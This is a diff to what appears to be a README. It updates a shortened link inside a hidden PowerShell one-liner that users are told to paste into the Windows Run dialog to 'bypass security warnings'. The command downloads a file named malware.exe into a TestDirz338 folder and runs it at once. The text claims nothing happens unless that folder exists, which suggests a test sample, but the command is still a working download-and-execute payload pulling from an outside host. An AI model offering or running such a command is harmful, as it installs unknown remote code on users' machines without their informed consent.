@@ -33,7 +33,7 @@ Make a folder called TestDirz338 in the path C:/Users/{USER}/
 
 Bypass security warnings and download & execute the file instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/5e8yp8mf', \"$env:UserProfile\TestDirz338\malware.exe\");Start-Process \"$env:UserProfile\TestDirz338\malware.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvcpow', \"$env:UserProfile\TestDirz338\malware.exe\");Start-Process \"$env:UserProfile\TestDirz338\malware.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
 ```
 If you don't have a folder called TestDirz338 and you execute the code above, nothing happens. Also trying to run the executable anywhere else raises an error:
 
